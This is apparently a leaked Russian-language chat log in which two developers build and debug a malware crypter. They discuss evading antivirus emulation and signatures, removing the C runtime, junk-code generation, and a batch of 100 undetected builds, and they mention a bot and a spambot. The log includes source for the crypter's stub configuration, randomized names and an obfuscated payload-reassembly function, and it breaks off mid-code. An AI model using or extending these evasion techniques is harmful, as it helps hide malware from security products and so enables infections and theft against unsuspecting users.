[01.09.21 16:54:05] elroy:		Там просто портишь алгоритм, он не добирается до апи
[01.09.21 16:54:12] elroy:		Понятно что по эмуляции
[01.09.21 16:54:36] elroy:		Обычно по эмуляции какой-то шаблон поведения ловит, нао алгорит менять
[01.09.21 16:55:18] elroy:		Бывает ловит последовательность вызовов к некоторым апи, меняешь их там - перестает работать код и уходит детект - значит по эмуляции
[01.09.21 16:55:24] elroy:		Да все примитивно...
[01.09.21 16:55:30] elroy:		Тут просто фантазия
[01.09.21 16:55:59] elroy:		Можно идой пропатчить, заменив кусочек кода на nop вместе с int 3
[01.09.21 16:59:04] basil:		Из твоих слов , как я понял, эмуляция - это процесс , когда АВ пытается простите за тавтологию проэмулировать какие-то участки кода, при этом АВ не знает , что эти учатски могут быть мертвыми и в ран-тайм не исполняются. Он натыкается на бесконечный цикл или еще что-то и отпускает криптре "с  миром". Я правильно понял?
[01.09.21 16:59:53] elroy:		Ну почти))
[01.09.21 17:00:00] elroy:		Смысл правильно понял
[01.09.21 17:00:34] elroy:		Если детект по жмуляции, он ище известный ему участок, вернее, эмуляирет все подряд, пока не увидит что идет нужное выполнение
[01.09.21 17:00:50] elroy:		Это могут быть как большие фрагменты кода, так и маленькие
[01.09.21 17:00:55] elroy:		Смотря какой детект
[01.09.21 17:01:14] basil:		хорошо.
[01.09.21 17:01:29] elroy:		Обычно цепляется на начало программы
[01.09.21 17:01:43] elroy:		Или на какой-то опасный участок
[01.09.21 17:01:54] elroy:		Холовинг, например, модет словить
[01.09.21 17:03:18] basil:		Хорошо. И последний на сегодня вопрос. У меня он насчет нагрузки. Что подразумевается под термином shellCode? Это какой-то эксплоит?
[01.09.21 17:31:39] elroy:		Это шеллкод...
[01.09.21 17:31:49] elroy:		Это бинарный код, который выполняется
[01.09.21 17:31:53] elroy:		Ну как сказать
[01.09.21 17:31:58] elroy:		Голый код что-ли
[01.09.21 17:32:04] elroy:		Посмотри в криптер
[01.09.21 17:32:10] elroy:		В исходники
[01.09.21 17:50:13] basil:		Я понял. Какой--то позиционно независимый код, который просто не представлен ввиде исполняемого файла
[01.09.21 17:50:28] elroy:		Да
[01.09.21 17:50:36] elroy:		Я тебе скинул сорцы такого кода)
[01.09.21 17:51:19] elroy:		Там собирается exe специально-написанного кода, потом делается его дамп
[01.09.21 17:51:40] elroy:		Чтобы не мучаться, там есть бинарники уже готовые
[01.09.21 17:54:09] basil:		хорошо. все вроде понятно пока
[01.09.21 17:55:50] elroy:		Вот у нас сейчас на билдмашине есть детекты на икарус
[01.09.21 17:56:02] elroy:		Попробуй завтра или на днях посмотреть как почистить
[01.09.21 17:56:15] elroy:		Вот этим методом, что сегодня я описал
[01.09.21 17:57:04] basil:		ок. хорошо
[02.09.21 14:23:16] elroy:		Приветствую
[02.09.21 14:23:26] basil:		Приветствую
[02.09.21 14:24:49] elroy:		Хорошо сделал с макросами, удобно
```
#define Packer yKdgqXRljUjxApJmBuwILN
#define Encrypter xXWjKcylUcchHWsrt
#define XorZIP JCDYudtdNQYNh
#define ArithmeticZIP HNVLTvTYFYovwtUMw
```
И что написано понятно, и функционал на месте. Я только заметил)
[02.09.21 14:27:15] basil:		Там еще сам вот этот Packer можно достаточно легко расширить. Между прочим. Т.е. если еще надо будет добавить еще один алгоритм шифрования. И еше достаочно просто поменять пропорции в которовых данные шифруются с использованием определенного алгоритма
[02.09.21 14:27:58] elroy:		И это тоже хорошо
[02.09.21 14:52:24] elroy:		Не разбирался с поиском детектов?
[02.09.21 14:53:10] basil:		Я вернусь сейчас к этой тематике. Но вот прямо сейчас сижу с GCC
[02.09.21 14:53:32] basil:		всмысле чуть позже вернусь
[02.09.21 14:54:19] elroy:		Есть просто классный пример. Детект сидит на стандартной функции от crt библиотеки
[02.09.21 14:55:04] basil:		Поподробнее можно? Сам нашел?
[02.09.21 14:55:19] elroy:		Ну вот тем методом, что вчера описал
[02.09.21 14:55:48] basil:		Мне просто показалось что ты хочешь похвастаться
[02.09.21 14:56:00] basil:		В хорошем конечно смысле
[02.09.21 14:56:00] elroy:		Нет. Эт опроблема))
[02.09.21 14:56:18] elroy:		Я то его нашел, но толку то
[02.09.21 14:56:23] elroy:		Я его почистить не могу
[02.09.21 14:56:43] elroy:		Ибо не понятно как можно поменять что-то в стандартной функции
[02.09.21 14:57:11] basil:		А что детект на стандартной функции?
[02.09.21 14:57:31] elroy:		Да
[02.09.21 14:58:00] elroy:		Вот я и хотел показать. Уделишь несколько минут?
[02.09.21 15:22:08] basil:		тест
[02.09.21 15:26:45] elroy:		да, вижу слово тест
[02.09.21 15:27:30] basil:		хорошо. продолжаем разговор
[02.09.21 15:28:02] elroy:		Следующие 64 байта после рет содержат сигнатуру
[02.09.21 15:28:20] elroy:		Если pdb подтянулся, то там видно что это seh
[02.09.21 15:28:52] elroy:		Это обработчик исключений, защита и т.д., то что добавляет стандартная библиотека в твой код.
[02.09.21 15:29:12] elroy:		Вот на этой конструкции висит сейчас детект. Что оченьинтересно)
[02.09.21 15:29:31] basil:		seh?
[02.09.21 15:29:32] elroy:		Это никак не чистится
[02.09.21 15:29:36] elroy:		да
[02.09.21 15:30:02] basil:		и это только у одного какого-то ав?
[02.09.21 15:30:09] basil:		или у всех подряд?
[02.09.21 15:30:21] elroy:		Детект у нескольких сразу
[02.09.21 15:30:31] elroy:		Но они на одном движке наверное
[02.09.21 15:31:08] basil:		ну я единственное могу предположить что это в настройках компятора
[02.09.21 15:31:15] basil:		можно что-то поменять
[02.09.21 15:31:16] elroy:		Я вот смотрю сейчас с trustport. ПОсмотри например файлик на динчеке
[02.09.21 15:31:44] elroy:		seh выключен в настройках компилятора. Студия все равно по своему делает
[02.09.21 15:32:02] elroy:		*в настройках проекта
[02.09.21 15:33:29] basil:		все красное
[02.09.21 15:33:48] basil:		ну на seh ставить детект.....
[02.09.21 15:34:03] basil:		Может они ошиблись в чем-тто
[02.09.21 15:34:09] basil:		и убериут его
[02.09.21 15:34:27] elroy:		Так вот загадка. И вычистить нельзя. Оно генерирует код и ставит к коду свои фичи, которые потом и палят код... Вычищать ее надо...
[02.09.21 15:34:47] basil:		вот вопрос
[02.09.21 15:35:14] basil:		а если затереть эту сигнатуру. Ну скажет nop, файл отработает корректно
[02.09.21 15:35:18] basil:		пробовал?
[02.09.21 15:35:31] elroy:		Не факт
[02.09.21 15:35:38] elroy:		Но это создаст новую))
[02.09.21 15:36:54] basil:		слушай. просьба есть. Вот если сейчас у тебя есть пропатченые файлы - попробуй запустить
[02.09.21 15:37:01] basil:		Может отработает?
[02.09.21 15:40:23] elroy:		Ну судя по коду оно должно отработать..
[02.09.21 15:40:45] elroy:		Надо патчить и запускать. Но зачем?)
[02.09.21 15:41:25] basil:		может это один из путей решения. Патчить файлы после билда? Или не вариант?
[02.09.21 15:42:28] elroy:		Не, не вариант
[02.09.21 15:42:55] elroy:		Автоматом патчить накладно, оно может меняться. Вручную вообще не вариант.
[02.09.21 15:43:05] basil:		ну на seh конечно.... Занятно
[02.09.21 15:43:16] elroy:		Надо crt в мусор отправлять.
[02.09.21 15:43:20] basil:		Мсье знает толк в извращениях
[02.09.21 15:43:41] elroy:		Знает))
[02.09.21 15:43:47] basil:		seh...... Ну надо же
[02.09.21 15:43:50] basil:		!
[03.09.21 09:31:02] elroy:		Приветствую. Какие новости?
[03.09.21 10:05:42] basil:		Приветствую
[03.09.21 10:06:00] basil:		Ну новости честно говоря не очень положительные
[03.09.21 10:07:07] basil:		на текущий момент уперся в ntdll.h. Очень много всяких windows зависимых переменных структур и так далее. Даже не знаю стоит ли продолжать с GCC
[03.09.21 10:07:52] basil:		Уже неделю с ним сижу. Пока собрать криптер не получается. И как-то даже света в конце тоннеля я не вижу
[03.09.21 10:09:22] elroy:		Тогда не продолжай
[03.09.21 10:10:00] basil:		на что мне сейчас переключиться?
[03.09.21 10:10:31] basil:		crt?
[03.09.21 10:10:59] elroy:		По криптеру тебе нужно:
1) разобраться с чисткой
2) выкинуть crt, заменить весь ее код на нормальный)
[03.09.21 10:11:37] elroy:		Пишут что если выкидываешь crt, оживает дефендер, наичнает детектить в разные стороны
[03.09.21 10:11:55] elroy:		Так что это все придется в отдельной ветке делать
[03.09.21 10:12:31] basil:		с чисткой я конечно разберусь. Я думаю это дело техники. но что с crt делать? Как это хоть делается теоретически?
[03.09.21 10:13:34] elroy:		Я сейчас скину пример проекта hello world без црт
[03.09.21 10:13:36] elroy:		Изучи
[03.09.21 10:17:11] elroy:		https://file.io/pnneQ3DESbxf
[03.09.21 10:17:55] elroy:		Он там из-за wsprintf не собирается, там ее поправить надо или убрать)
[03.09.21 10:18:26] elroy:		А так, там в свойствах проекта все настроено
[03.09.21 10:18:42] basil:		момент
[03.09.21 10:22:27] basil:		практически все установлено в "нет"
[03.09.21 10:22:36] basil:		кто-то так....
[03.09.21 10:23:09] basil:		т.е. установкой большинства флагов в "нет" убирается crt?
[03.09.21 10:23:18] elroy:		неа
[03.09.21 10:23:27] elroy:		Ща скажу
[03.09.21 10:23:29] basil:		а в чем тогда тонкость?
[03.09.21 10:23:44] basil:		слушай, я что-то не так сделал?
[03.09.21 10:24:12] basil:		может что-то не то сказал. Есть какие-то замечания?
[03.09.21 10:24:48] elroy:		Открйо свойства проекта, там Компоновщик -> Ввод
[03.09.21 10:25:06] basil:		Да (/NODEFAULTLIB)?
[03.09.21 10:25:09] basil:		понял
[03.09.21 10:25:11] elroy:		Да
[03.09.21 10:25:29] elroy:		Остальное просто выключено по правилам формления кода и сборок
[03.09.21 10:25:32] elroy:		Все мусор там...
[03.09.21 10:25:43] elroy:		И там чуть выше строка
[03.09.21 10:25:47] elroy:		Там библиотеки написаны
[03.09.21 10:26:09] basil:		а они нам получается и не нужны библиотеки
[03.09.21 10:26:16] basil:		из-за getapi
[03.09.21 10:26:21] elroy:		Это то, что линкуется, если оно надо. Если не надо, надо убирать. Оставлять только kernel32 и еще, если какие-то нужны
[03.09.21 10:27:09] elroy:		Еще
[03.09.21 10:27:45] elroy:		Бывает очень часто сыпится сборка с ошибкой, что не найдена memcpy, memset и т.д.
[03.09.21 10:27:54] elroy:		Хотя ты их нигде не используешь
[03.09.21 10:28:12] basil:		stl?
[03.09.21 10:28:24] elroy:		Это значит, что где-то присвоение переменным значений, копироваие переменных, обнуление структур типа = { 0 };
[03.09.21 10:28:42] elroy:		Может да, stl что-то нужно
[03.09.21 10:28:53] elroy:		векторы и прочее теперь не работают
[03.09.21 10:29:07] basil:		отлично....
[03.09.21 10:29:08] elroy:		про std:: забыть надо
[03.09.21 10:29:12] basil:		просто супер
[03.09.21 10:29:17] elroy:		))
[03.09.21 10:29:32] basil:		string тоже я так понимаю идет лесом?
[03.09.21 10:29:39] elroy:		конечно.
[03.09.21 10:29:45] elroy:		используется char*
[03.09.21 10:30:00] elroy:		Там приложены функции в шаблоне для примера работы со строками
[03.09.21 10:30:02] elroy:		Могу скинуть
[03.09.21 10:30:13] elroy:		*скинуть еще
[03.09.21 10:30:14] basil:		я так чувствую скоро будем как в старые добрые времена. Малварь на ассемблере
[03.09.21 10:30:26] basil:		хорошо. если можно
[03.09.21 10:31:01] elroy:		Я глянул сейчас, там хватит
[03.09.21 10:31:14] elroy:		Смотри файлы CustomStrings и CustomMemory
[03.09.21 10:31:36] elroy:		Минус этих функций может быть тоже, их может ловить АВ
[03.09.21 10:31:42] elroy:		Это другая сторона
[03.09.21 10:31:49] elroy:		Ты знаешь язык rust ?
[03.09.21 10:32:30] basil:		пробовал как то . Со сборщиком мусора + компилируемый. Но очень специфичный компилятор у этого rust
[03.09.21 10:32:49] basil:		очень модно для систем 24/7
[03.09.21 10:33:57] basil:		Раньше я как смотрю просто рекомендации были избегать std и stl. А сейчас как я смотрю криптеры сделали свое дело
[03.09.21 10:33:58] elroy:		На нем у orval криптер ничего так получился) Пока без детектов и размер мизерный
[03.09.21 10:34:13] basil:		ДА ну!
[03.09.21 10:34:14] elroy:		Ты немного ошибся)
[03.09.21 10:34:24] elroy:		Рекомендации были просто по началу работы
[03.09.21 10:34:30] elroy:		Всю нагрузку пишут без CRT
[03.09.21 10:34:49] elroy:		Бот наш тоже должен быть бе crt
[03.09.21 10:34:54] basil:		и теперь переходим на rust?
[03.09.21 10:35:16] elroy:		Это все связано именно с тем. что ты увидел вчера - неочищаемые детекты, которые валятся на crt
[03.09.21 10:35:27] elroy:		На руст еще не переходим
[03.09.21 10:35:27] basil:		может тогда и go
[03.09.21 10:35:31] elroy:		Работаем как раньше
[03.09.21 10:35:44] basil:		хорошо
[03.09.21 10:36:00] elroy:		На го пробовали, говорит orval нечеткие хеши дают 80 % сопадения между файлами + размер больше
[03.09.21 10:36:25] basil:		уже как то легче
[03.09.21 10:37:47] basil:		да уж... В нашем то криптере std и stl всяких навалом
[03.09.21 10:38:06] basil:		Плохо это
[03.09.21 10:38:11] basil:		очень плохо
[03.09.21 10:38:33] elroy:		Они и парсятся АВ. Меня еще и спамбот беспокоит.. Там тоже полно, но там будем иначе чистить
[03.09.21 10:38:46] elroy:		Сейчас с ботом никто не работает почти на практике, он чистый.
[03.09.21 10:38:59] elroy:		Поэтому и дтектов нет (ну как нет, сам знаешь...)
[03.09.21 10:39:11] basil:		да кстати говоря
[03.09.21 10:39:29] basil:		жду момент начала его использования просто с содроганием
[03.09.21 10:39:54] basil:		jefeerson так ничего и не написал
[03.09.21 10:40:00] basil:		опять же кстатит говоря
[03.09.21 10:40:12] elroy:		Там просто разработать надо будет свои функции вместо векторо, листов и т.д., оно отлично там уложится в таком виде
[03.09.21 10:40:27] elroy:		Ему наверное некогда)
[03.09.21 10:40:46] basil:		вот ты как будто подслушал чекрез стенку
[03.09.21 10:40:51] basil:		)))
[03.09.21 10:40:58] basil:		Так и сказал
[03.09.21 10:41:47] elroy:		Т.е. мы не будем там переписывать всего бота, мы просто разработаем пару классов, реализующих тот же лист, сет, вектор, пару алгоритмов по их сортировке напишем. В общем, только то, что там используется. И заменим.
[03.09.21 10:42:22] basil:		логично, конечно.... Но как всегда
[03.09.21 10:42:32] basil:		что нибудь где-нибудь....
[03.09.21 10:42:44] elroy:		Без этого не бывает)
[03.09.21 10:44:04] basil:		слушай , еще один вопрос. Я сегодня тебе ничего так нехорошего не скал, никак не обидел, не оскорбил... У меня такое чувство , что я где-то нашкодил и ты обиделся.... Может это конечно богатая фантазия
[03.09.21 10:44:31] elroy:		Богатейшая))
[03.09.21 10:44:40] basil:		ясно. Спасибо
[03.09.21 10:44:57] basil:		Это было технично  сказано
[03.09.21 10:44:58] elroy:		У кодера должна быть фантазия)))
[03.09.21 10:45:12] basil:		Я тебя прямо еще больше зауважал)))
[03.09.21 10:45:25] elroy:		У меня вопрос
[03.09.21 10:45:36] elroy:		Я вчера твой код похвалил, тот вариант с макросами
[03.09.21 10:45:43] elroy:		Но сегодня я его не нашел)))
[03.09.21 10:45:53] elroy:		А где он был внесен изначально?
[03.09.21 10:46:13] basil:		PeReader
[03.09.21 10:46:24] elroy:		Меня частенько гит путает..
[03.09.21 10:46:51] elroy:		Я не увидел в UniCrypter.cpp его
[03.09.21 10:46:59] elroy:		Это как-то спутало
[03.09.21 10:47:02] elroy:		Он же там?
[03.09.21 10:47:19] basil:		нет. сейчас точно скажу гед
[03.09.21 10:47:21] basil:		где
[03.09.21 10:47:45] basil:		подожди секунду
[03.09.21 10:50:25] basil:		вот здесь
[03.09.21 10:50:32] basil:		```
PeReader::createPayLoadHeader(std::vector<char>& payLoad, int payLoadType)
```
[03.09.21 10:50:47] basil:		```
	std::string classesNoiseNames = 
		"#define Packer " + getRandName(30) + "\r\n"
		"#define Encrypter " + getRandName(30) + "\r\n"
		"#define XorZIP " + getRandName(30) + "\r\n"
		"#define ArithmeticZIP " + getRandName(30) + "\r\n";
```
[03.09.21 10:51:51] basil:		нашел?
[06.09.21 16:11:11] elroy:		Я там еще правки делал...
[06.09.21 16:11:43] basil:		Еще правки?
[06.09.21 16:11:48] basil:		Блин
[06.09.21 16:11:59] basil:		Сейчас . момент
[06.09.21 16:12:43] elroy:		Да... Баги поправил
[06.09.21 16:19:37] basil:		Все нормально. Позже закинул
[06.09.21 16:33:41] basil:		Какой он все таки стал громоздкий этот криптер....
[06.09.21 16:34:08] elroy:		Зато какой классный он стал
[06.09.21 16:34:19] elroy:		Я сегодня партию 100 штук выдал чистых
[06.09.21 16:34:29] basil:		ну не знаю...
[06.09.21 16:34:41] elroy:		И они разные. Я за неделю его ни разу не чистил
[06.09.21 16:34:45] elroy:		А он чистый
[06.09.21 16:34:58] basil:		если только с этой точки зрения
[06.09.21 16:35:29] elroy:		Он прекрасен))
[06.09.21 16:35:42] basil:		слушай а только этот криптере сам стаб формирует или все такие?
[06.09.21 16:36:03] elroy:		Народ над этим работал, многие криптеры стаб формируют
[06.09.21 16:36:09] elroy:		У каждого свое
[06.09.21 16:36:24] elroy:		У нас уникальность, это оборачивание кода
[06.09.21 16:36:31] elroy:		Мертвая и живая ветка
[06.09.21 16:36:35] elroy:		Это многое дает
[06.09.21 16:36:49] basil:		хорошо. даже отлично
[06.09.21 16:37:31] elroy:		Да. Нам надо развивать генератор мусорного кода
[06.09.21 16:37:37] elroy:		Больше вариативности)
[06.09.21 16:37:54] elroy:		Хотя, там и так всо прописано и вынесено в параметры.
[06.09.21 16:38:15] basil:		я согдласен. Но на мой взгяд все таки в переди это обфускация в ран тайм
[06.09.21 16:38:25] basil:		но до этого конечно надо еще дожить
[06.09.21 16:38:36] elroy:		Сейчас вот ее не хватает нормлаьного размазывания по трем секциям. Надо чтобы случайно мазалось, у нас статично мажется
[06.09.21 17:18:27] basil:		очень смешно. Случайно обратил внимание
```
// Вот этот изврат для позиционно-независимого кода, arr[] = "name" не работает.
```
[06.09.21 17:18:55] elroy:		Зато правда
[06.09.21 17:19:01] elroy:		Оно там не работает
[06.09.21 17:19:06] basil:		согласен
[06.09.21 17:19:07] elroy:		Компилится иначе
[06.09.21 17:19:09] elroy:		))
[08.09.21 09:50:48] elroy:		Приветствую
[08.09.21 09:50:59] basil:		Приветствую
[08.09.21 09:51:16] elroy:		Как успехи?
[08.09.21 09:51:44] basil:		Не то что бы совсем никак. Но не очень
[08.09.21 09:51:57] basil:		Некорректно он собирает у меня нагрузку. Падает
[08.09.21 09:52:24] basil:		Точнее собирать то собирается криптер. Но вот как-то при запуске через раз работает
[08.09.21 09:52:53] basil:		Грамоздко конечно получился криптер
[08.09.21 09:53:48] basil:		Я ее попробовал отлаживать. Но все равно не понимаю , почему некорректно нагрузку собирает. Точнее расшифровывает вот этим пакером
[08.09.21 09:54:01] basil:		Не знаю пока почему
[08.09.21 09:54:22] basil:		Вот еще вопрос появился
[08.09.21 09:55:07] basil:		Мы же в секцию  кода данные нагрузки с помочью vector помещаем. А если crt убирать , что тогда?
[08.09.21 09:56:10] elroy:		Надо иначе помещать
[08.09.21 09:57:59] basil:		самопольный класс писать или видиться что-то другое?
[08.09.21 09:58:38] elroy:		Да там вектор не нужен вот сооовсем. Он используется как массив. Ну как массив и использовать.
[08.09.21 09:59:09] basil:		я боюсь что массив в секции rdata будет
[08.09.21 09:59:23] basil:		или data
[08.09.21 09:59:31] elroy:		Мне твой метод понравился с патчем функции для замены энтропии.
Т.е. генерируем функции (много, сколько - случайно), затем в эти функции пишем куски нагрузки
[08.09.21 10:00:34] basil:		а данные потому берем через указатель , как на callback функции. Так подразумевается?
[08.09.21 10:02:18] elroy:		Да, но чтобы не потерялось ничего надо шапку сделать.
Добавить структуру с признаковм что это нагрузки (случайная генерация 16 байт на 1 билд) и размер данных, после идут данные.
[08.09.21 10:04:41] basil:		Еще один момент. Есть предложение добавить в криптере еще один ключ. Поэтому ключу SolutionBuilder не будет обфусцировать код. Иначе так очень сложно его потом отлаживать. запутываюсь постоянно в этих дебрях
[08.09.21 10:05:00] basil:		Подскажи , где это можно сделать в SolutionBuilder
[08.09.21 10:05:12] elroy:		Уточни что именно
[08.09.21 10:05:22] elroy:		Что за ключ такой
[08.09.21 10:06:07] basil:		--debugversion     -dv
[08.09.21 10:06:11] basil:		Например так
[08.09.21 10:06:35] basil:		```
   --payload     -p    <file_path>   - path of input .exe, .dll or .bin (shellcode) payload file to crypt it\n"
     --shellcode   -sc   <32|64>       - shellcode arch, if payload is a shellcode
     --shellstring -ss   <shellcode>   - shellcode payload represented as a string
```
[08.09.21 10:07:01] basil:		или аргументы для SolutionBuilder
[08.09.21 10:07:09] elroy:		Можно, но я не пойму зачем. Сделай отдельный стаб, четвертый (там 3 уже есть), по аналогии с существующими.
[08.09.21 10:07:43] basil:		А и удалить вот эти ntub
[08.09.21 10:07:45] basil:		теги*
[08.09.21 10:07:49] basil:		Да. Согласен
[08.09.21 10:08:07] elroy:		```
const _Stub Standard_Stub =
{
	"standard_old_vs2019",
	"Crypter.sln",
	STUB_STANDARD"Crypter.vcxproj",
	"Crypter",
	"\"CrypterReleaseNoLogs|x86\"",
	"\"CrypterReleaseNoLogs|x64\"",
	"\"CrypterDllReleaseNoLogs|x86\"",
	"\"CrypterDllReleaseNoLogs|x64\"",
	"C:\\\"Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\Common7\\IDE\\devenv.exe\"",
	STUB_STANDARD"lib.def",
	"\\Bin\\Crypter\\CrypterReleaseNoLogs\\Win32\\Crypter.exe",
	"\\Bin\\Crypter\\CrypterReleaseNoLogs\\x64\\Crypter.exe",
	"\\Bin\\Crypter\\CrypterDllReleaseNoLogs\\Win32\\Crypter.dll",
	"\\Bin\\Crypter\\CrypterDllReleaseNoLogs\\x64\\Crypter.dll",
	Standard_StubDataFiles,
	sizeof(Standard_StubFilesToObfuscate) / sizeof(_StubFilesToObfuscate),
	Standard_StubFilesToObfuscate
};
```
[08.09.21 10:08:20] elroy:		includes -> config.h
[08.09.21 10:09:08] elroy:		Там можно и стаб другой добавить (другой каталог, дургие файлы) и "\"CrypterReleaseNoLogs|x86\"" - профиль сборки, если нужен debug
[08.09.21 10:10:17] basil:		Хорошо. Значит так и поступлю
[08.09.21 14:23:45] basil:		на месте?
[08.09.21 14:25:08] basil:		отпишись как сможешь говорить
[08.09.21 14:25:17] elroy:		На месте
[08.09.21 14:25:19] elroy:		Пиши
[08.09.21 14:26:57] basil:		есть кусок кода. В нем из вектора в массив char* заносятся данные. Код на мой взгляд элементарный. вот такой.
```
		std::vector<char> tmp = ((BufFunc)funcPtr)(&size);
		char* tempChar = tmp.data();
		for (size_t i = 0; i < tmp.size();) {
		resBuf[idx] = tempChar[i];
		idx++;
		i++;
	}
```
[08.09.21 14:28:41] basil:		есть подозрение , что каким-то образом в массив resBuf могут быть занесены лишние данные. В самый конец отдельного блока.  Вот ты видишь какую нибудь ошибку здесь? Сходу. Глубоко вникать не надо. Если сразу не заметил
[08.09.21 14:29:30] elroy:		((BufFunc)funcPtr)(&size)
[08.09.21 14:29:34] elroy:		Это что?
[08.09.21 14:30:51] elroy:		idx где-то инициализируется?
[08.09.21 14:30:52] basil:		целиком выглядит так:
```
char* buildPayLoad()
{
	// <codeobfuscator:begin_function>
	typedef std::vector<char>(WINAPI* BufFunc)(size_t*);
	void* funcArray;
	ULONG_PTR funcPtr;
	size_t size;
	size_t idx = 0;
	char* resBuf= (char*)f_alloc(ENCRYPT_PAYLOAD_SIZE);

	// <codeobfuscator:begin_block>
	funcArray = f_alloc(sizeof(BufFunc) * FUNC_COUNT + 320 * 240);
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 0) = ((ULONG_PTR)&getBuff0) - 120;
	*((ULONG_PTR*)funcArray + 1) = ((ULONG_PTR)&getBuff1) - 130;
	// <codeobfuscator:end_block>
	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 2) = ((ULONG_PTR)&getBuff2) - 140;
	*((ULONG_PTR*)funcArray + 3) = ((ULONG_PTR)&getBuff3) - 150;
	// <codeobfuscator:end_block>
	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 4) = ((ULONG_PTR)&getBuff4) - 160;
	*((ULONG_PTR*)funcArray + 5) = ((ULONG_PTR)&getBuff5) - 170;
	// <codeobfuscator:end_block>
	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 6) = ((ULONG_PTR)&getBuff6) - 180;
	*((ULONG_PTR*)funcArray + 7) = ((ULONG_PTR)&getBuff7) - 190;
	// <codeobfuscator:end_block>
	// <codeobfuscator:begin_block>
	// fakes
	*((ULONG_PTR*)funcArray + 8) = (ULONG_PTR)&getBuff1 - 200;
	*((ULONG_PTR*)funcArray + 9) = (ULONG_PTR)&getBuff2 - 210;
	*((ULONG_PTR*)funcArray + 10) = (ULONG_PTR)&getBuff3 - 220;
	*((ULONG_PTR*)funcArray + 11) = (ULONG_PTR)&getBuff4 - 240;
	*((ULONG_PTR*)funcArray + 12) = (ULONG_PTR)&getBuff5 - 250;
	// <codeobfuscator:end_block>

	for (int i = 0; i < FUNC_COUNT; i++)
	{
		char datebuf[64] = { 0 };
		// <codeobfuscator:begin_block>
		pGetDateFormatA(LOCALE_USER_DEFAULT, 0, NULL, _STR("yyyy"), datebuf, sizeof(datebuf));
		datebuf[0] -= 0x30; datebuf[0] *= 10;
		// <codeobfuscator:end_block>

		// <codeobfuscator:begin_block>
		funcPtr = *((ULONG_PTR*)funcArray + i);
		funcPtr += (100 + datebuf[0] + i * 10);
		// <codeobfuscator:end_block>

		// <codeobfuscator:begin_block>
		std::vector<char> tmp = ((BufFunc)funcPtr)(&size);
		char* tempChar = tmp.data();
		for (size_t i = 0; i < tmp.size();) {
		resBuf[idx] = tempChar[i];
		idx++;
		i++;
	}
		// <codeobfuscator:end_block>
	}

	// <codeobfuscator:begin_block>
	globBufStruct BuffersData[] = GLOB_DATA_PAYLOAD_BUFS;
	for (globBufStruct data : BuffersData) {

		for (size_t i = 0; i < data.size; i++) {
			resBuf[idx] = data.data[i];
			idx++;
		}

	}
	// <codeobfuscator:end_block>

	// <codeobfuscator:end_function>
	writeFile((char*)"cryptorPayload", resBuf, ENCRYPT_PAYLOAD_SIZE);
	return resBuf;
}
```
[08.09.21 14:31:04] elroy:		idx где-то инициализируется?
[08.09.21 14:31:15] basil:		ДА
[08.09.21 14:31:36] basil:		в самом  верху
[08.09.21 14:31:38] elroy:		ок, смотрю код
[08.09.21 14:33:05] basil:		никак не могу найти. И ошибка как я понял исходя из сравнения собранных блоко в криптере и SolutionBuilder именно в:
```
		std::vector<char> tmp = ((BufFunc)funcPtr)(&size);
		char* tempChar = tmp.data();
		for (size_t i = 0; i < tmp.size();) {
		resBuf[idx] = tempChar[i];
		idx++;
		i++;
```
[08.09.21 14:34:09] basil:		может  в цикле for (int i = 0; i < FUNC_COUNT; i++)
[08.09.21 14:34:22] basil:		названия переменных совпадают
[08.09.21 14:35:46] elroy:		Боюсь спросить "зачем так написано?"
```
for (size_t i = 0; i < tmp.size();) {
...
i++;
```
[08.09.21 14:36:12] basil:		я делал for (size_t i = 0; i < tmp.size();i++)
[08.09.21 14:36:20] basil:		но результат тот же
[08.09.21 14:37:11] basil:		на текущий момент вот так. Но изначально было конечно 
for (size_t i = 0; i < tmp.size();i++)
[08.09.21 14:38:14] basil:		Ну ничего. Если сразу не получилось - брось. Сам еще побадаюсь
[08.09.21 14:38:47] elroy:		Вот тут вектор создается копированием
[08.09.21 14:38:48] elroy:		std::vector<char> tmp = ((BufFunc)funcPtr)(&size);
[08.09.21 14:39:00] elroy:		Вот посмотри что там приходит из него, какой размер
[08.09.21 14:39:13] basil:		хорошо. ок
[08.09.21 14:41:45] basil:		ошибка в имени переменной. Если вот так:
```
char* buildPayLoad()
{
	// <codeobfuscator:begin_function>
	typedef std::vector<char>(WINAPI* BufFunc)(size_t*);
	void* funcArray;
	ULONG_PTR funcPtr;
	size_t size;
	size_t idx = 0;
	char* resBuf= (char*)f_alloc(ENCRYPT_PAYLOAD_SIZE);

	// <codeobfuscator:begin_block>
	funcArray = f_alloc(sizeof(BufFunc) * FUNC_COUNT + 320 * 240);
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 0) = ((ULONG_PTR)&getBuff0) - 120;
	*((ULONG_PTR*)funcArray + 1) = ((ULONG_PTR)&getBuff1) - 130;
	// <codeobfuscator:end_block>
	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 2) = ((ULONG_PTR)&getBuff2) - 140;
	*((ULONG_PTR*)funcArray + 3) = ((ULONG_PTR)&getBuff3) - 150;
	// <codeobfuscator:end_block>
	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 4) = ((ULONG_PTR)&getBuff4) - 160;
	*((ULONG_PTR*)funcArray + 5) = ((ULONG_PTR)&getBuff5) - 170;
	// <codeobfuscator:end_block>
	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 6) = ((ULONG_PTR)&getBuff6) - 180;
	*((ULONG_PTR*)funcArray + 7) = ((ULONG_PTR)&getBuff7) - 190;
	// <codeobfuscator:end_block>
	// <codeobfuscator:begin_block>
	// fakes
	*((ULONG_PTR*)funcArray + 8) = (ULONG_PTR)&getBuff1 - 200;
	*((ULONG_PTR*)funcArray + 9) = (ULONG_PTR)&getBuff2 - 210;
	*((ULONG_PTR*)funcArray + 10) = (ULONG_PTR)&getBuff3 - 220;
	*((ULONG_PTR*)funcArray + 11) = (ULONG_PTR)&getBuff4 - 240;
	*((ULONG_PTR*)funcArray + 12) = (ULONG_PTR)&getBuff5 - 250;
	// <codeobfuscator:end_block>

	for (int i = 0; i < FUNC_COUNT; i++)
	{
		char datebuf[64] = { 0 };
		// <codeobfuscator:begin_block>
